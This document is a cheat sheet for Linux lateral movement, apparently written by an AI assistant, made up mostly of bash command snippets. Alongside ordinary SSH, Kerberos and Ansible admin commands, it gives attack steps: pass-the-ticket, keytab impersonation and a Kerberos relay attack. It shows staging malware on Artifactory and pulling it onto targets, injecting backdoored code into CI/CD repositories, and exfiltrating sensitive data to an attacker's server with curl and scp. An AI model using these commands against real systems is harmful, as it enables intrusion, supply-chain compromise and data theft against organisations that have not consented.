Here's a cheat sheet for Linux lateral movement, with a focus on SSH, Kerberos, Ansible, and Artifactory.

### ** SSH (Secure Shell)**

#### ** SSH Key Generation and Authentication**
- **Generate an SSH key pair**:
  ```bash
  ssh-keygen -t ed25519 -C "your_email@example.com"
  ```
- **Copy SSH public key to a remote server**:
  ```bash
  ssh-copy-id user@hostname
  ```
- **Agent forwarding** (use your local SSH keys on remote servers):
  ```bash
  ssh -A user@hostname
  ```

#### **SSH Port Forwarding**
- **Local port forwarding**:
  ```bash
  ssh -L local_port:remote_address:remote_port user@hostname
  ```
- **Remote port forwarding**:
  ```bash
  ssh -R remote_port:localhost:local_port user@hostname
  ```
- **Dynamic port forwarding (SOCKS proxy)**:
  ```bash
  ssh -D local_port user@hostname
  ```

### **Kerberos**

#### **Kerberos Authentication**
- **View Kerberos tickets**:
  ```bash
  klist
  ```
- **Obtain a Kerberos ticket-granting ticket (TGT)**:
  ```bash
  kinit user@REALM
  ```
- **Use a specific keytab file for Kerberos authentication**:
  ```bash
  kinit -kt /path/to/keytab user@REALM
  ```

#### ** Kerberos Ticket Manipulation**
- **Pass-the-Ticket (PTT)**:
  ```bash
  export KRB5CCNAME=/path/to/ccache
  ```
- **Impersonate a user with Kerberos TGT**:
  ```bash
  kinit -k -t /path/to/keytab other_user@REALM
  ```

#### ** Kerberos Delegation Attacks**
- **Check for services with unconstrained delegation**:
  ```bash
  ldapsearch -x -b "dc=domain,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" dn
  ```
- **Perform a Kerberos relay attack**:
  ```bash
  krbrelayx.py -t target_ip -c "whoami"
  ```

### ** Ansible**

#### ** Running Playbooks**
- **Run an Ansible playbook**:
  ```bash
  ansible-playbook playbook.yml -i inventory
  ```
- **Run a playbook with elevated privileges**:
  ```bash
  ansible-playbook playbook.yml -i inventory --become
  ```

#### **Ansible Configuration and Secrets Management**
- **Encrypt secrets with Ansible Vault**:
  ```bash
  ansible-vault encrypt secrets.yml
  ```
- **Decrypt secrets with Ansible Vault**:
  ```bash
  ansible-vault decrypt secrets.yml
  ```
- **Rekey an encrypted file**:
  ```bash
  ansible-vault rekey secrets.yml
  ```

#### ** Lateral Movement via Ansible**
- **Execute commands on multiple hosts**:
  ```bash
  ansible all -i inventory -m shell -a "command"
  ```
- **Upload files to multiple hosts**:
  ```bash
  ansible all -i inventory -m copy -a "src=/path/to/local/file dest=/path/to/remote/file"
  ```
- **Pivoting through an Ansible-managed host**:
  - Set up a jump host in your inventory:
    ```ini
    [jump_host]
    host1 ansible_host=192.168.1.1

    [target_hosts]
    host2 ansible_host=192.168.1.2 ansible_ssh_common_args='-o ProxyCommand="ssh -W %h:%p user@host1"'
```

### **Artifactory**

#### ** Accessing Artifactory Repositories**
- **Download an artifact from Artifactory**:
  ```bash
  curl -u user:password -O "http://artifactory.domain.com/artifactory/repo/path/to/artifact"
  ```
- **Upload an artifact to Artifactory**:
  ```bash
  curl -u user:password -T localfile "http://artifactory.domain.com/artifactory/repo/path/to/artifact"
  ```

#### **Enumerating Artifactory**
- **List repositories**:
  ```bash
  curl -u user:password "http://artifactory.domain.com/artifactory/api/repositories"
  ```
- **Search for artifacts by name**:
  ```bash
  curl -u user:password "http://artifactory.domain.com/artifactory/api/search/artifact?name=artifact_name"
  ```

#### **Leveraging Artifactory for Lateral Movement**
- **Use Artifactory as a staging area**:
  - Upload malicious scripts or binaries:
    ```bash
    curl -u user:password -T /path/to/malware "http://artifactory.domain.com/artifactory/repo/path/to/malware"
    ```
  - Download the payload on the target machine:
    ```bash
    curl -O "http://artifactory.domain.com/artifactory/repo/path/to/malware"
    ```
  
- **Compromise CI/CD pipelines**:
  - Inject malicious code into repositories:
    ```bash
    curl -u user:password -T /path/to/backdoored_code "http://artifactory.domain.com/artifactory/repo/path/to/source_code"
    ```

### **Other Lateral Movement Techniques**

#### ** Pivoting through Compromised Hosts**
- **SSH Dynamic Port Forwarding (SOCKS Proxy)**:
  ```bash
  ssh -D 1080 user@compromised_host
  ```
  Configure your proxy settings to use `localhost:1080` as a SOCKS proxy.

#### ** Data Exfiltration**
- **Exfiltrate data via HTTP/HTTPS**:
  ```bash
  curl -T /path/to/sensitive/data "http://your_server/upload"
  ```
- **Exfiltrate data via SSH**:
  ```bash
  scp /path/to/sensitive/data user@your_server:/path/to/destination
  ```

